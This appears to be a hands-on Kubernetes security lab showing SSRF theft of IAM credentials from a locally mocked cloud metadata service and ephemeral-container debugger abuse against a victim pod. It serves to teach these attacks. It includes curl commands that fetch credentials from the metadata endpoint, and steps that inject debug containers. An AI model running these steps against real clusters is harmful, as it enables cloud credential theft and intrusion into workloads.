# Lab 7 – SSRF & Ephemeral Containers

## Overview
This lab demonstrates two real-world Kubernetes attack techniques:
1. **SSRF to Cloud Metadata** – Using a compromised pod to steal cloud IAM credentials and pivot to cloud resource access.
2. **Ephemeral Container Debugger Abuse** – Injecting a debug container into a running pod to execute arbitrary tools.

---

## Part 1 – SSRF to Cloud Metadata

### Goal
Simulate an attacker in a compromised pod making HTTP requests to the node’s cloud metadata service to steal IAM credentials, then using those credentials to access cloud resources.

Since k3d isn’t running in AWS, we’ll mock the metadata service.

### Setup

#### 1. Create mock metadata and cloud resource data
```bash
mkdir -p mock-data/latest/meta-data/iam/security-credentials
cat > mock-data/latest/meta-data/iam/security-credentials/role-name <<EOF
{
  "Code" : "Success",
  "LastUpdated" : "2025-08-08T00:00:00Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "FAKEACCESSKEY12345",
  "SecretAccessKey" : "fakeSecretKey987654321",
  "Token" : "fakeSessionToken==",
  "Expiration" : "2025-08-09T00:00:00Z"
}
EOF

mkdir -p mock-data/cloud
cat > mock-data/cloud/resources.json <<EOF
{
  "Buckets": ["sensitive-logs", "customer-data", "prod-backups"],
  "VMs": ["k8s-node-1", "k8s-node-2"]
}
EOF
```

#### 2. Run the mock metadata & cloud resource service
```bash
docker run -d   --name mock-metadata   --network host   -v $(pwd)/mock-data:/usr/share/nginx/html   nginx:alpine
```

This exposes:
- `http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name`
- `http://169.254.169.254/cloud/resources.json`

#### 3. Bind the metadata IP to the host loopback
```bash
sudo ip addr add 169.254.169.254/32 dev lo

# test from the host
curl -s http://169.254.169.254/cloud/resources.json | jq .
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name | jq .
```

#### 4. Create the k3d cluster and namespace
```bash
k3d cluster create lab7 --servers 1 --agents 1
kubectl config use-context k3d-lab7
kubectl create ns lab7
```

#### 5. Deploy a victim pod
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: ssrf-victim
  namespace: lab7
spec:
  containers:
  - name: app
    image: curlimages/curl
    command: ["sleep", "infinity"]
```
```bash
kubectl apply -f ssrf-victim.yaml
kubectl -n lab7 wait pod/ssrf-victim --for=condition=Ready --timeout=90s
```

### Attack Steps

#### 1. Exec into the victim pod
```bash
kubectl -n lab7 exec -it ssrf-victim -- sh
```

#### 2. Retrieve IAM credentials
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
```

#### 3. Use stolen credentials to list “cloud resources”
```bash
curl http://169.254.169.254/cloud/resources.json
```

**Impact:** In a real cloud environment, these credentials could be used to list, read, or modify cloud resources — escalating a pod compromise into a cloud-level breach.

---

## Part 2 – Ephemeral Container Debugger Abuse

### Goal
Show how an attacker with RBAC permissions can inject a debug container into a running pod to gain access to its filesystem and processes.

### Setup

#### 1. Deploy a victim pod
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: victim-pod
  namespace: lab7
spec:
  containers:
  - name: web
    image: nginx
```
```bash
kubectl apply -f victim-pod.yaml
kubectl -n lab7 wait pod/victim-pod --for=condition=Ready --timeout=90s
```

### Attack Steps

#### 1. Inject a debug container
```bash
kubectl -n lab7 debug victim-pod --image=busybox --target=web
```

#### 2. Inside the ephemeral container, explore the victim’s filesystem & processes:
```bash
cat /etc/nginx/nginx.conf
ps aux
```

**Impact:** Ephemeral containers run in the same namespace as the target container, giving direct access to its processes, network, and files.

---

## Cleanup
```bash
kubectl delete ns lab7
docker rm -f mock-metadata
sudo ip addr del 169.254.169.254/32 dev lo
k3d cluster delete lab7
```

---

## Key Takeaways
- **SSRF to Cloud Metadata**: A pod compromise can lead to cloud account compromise if metadata services are accessible.
- **Ephemeral Container Abuse**: Even without modifying the pod spec, attackers can inject containers if RBAC allows it.
